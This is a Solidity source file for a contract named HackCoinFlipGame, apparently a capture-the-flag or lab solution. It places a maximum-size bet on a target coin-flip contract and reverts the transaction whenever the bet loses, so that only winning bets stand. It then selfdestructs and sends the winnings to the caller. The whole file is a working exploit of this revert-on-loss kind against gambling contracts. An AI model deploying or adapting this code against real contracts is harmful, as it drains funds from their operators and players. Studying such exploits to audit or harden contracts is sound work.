pragma solidity ^0.6.0;

interface Interface {
    function bet() external payable;
    function maxBet() external view returns(uint256);
}

contract HackCoinFlipGame {
    address public coinFlipGameAddr;

    constructor() public payable {}

    function hack(address addr) public payable{
        coinFlipGameAddr = addr;
        uint256 initialBalance = address(this).balance;

        Interface cfg = Interface(coinFlipGameAddr);
        cfg.bet.value(cfg.maxBet())();
        
        if(address(this).balance < initialBalance) {
            revert("Did not win");
        }

        selfdestruct(msg.sender);
    }
    
    function maxBet() public view returns(uint256) {
        Interface cfg = Interface(coinFlipGameAddr);
        return cfg.maxBet();
    }

    receive() external payable {}
}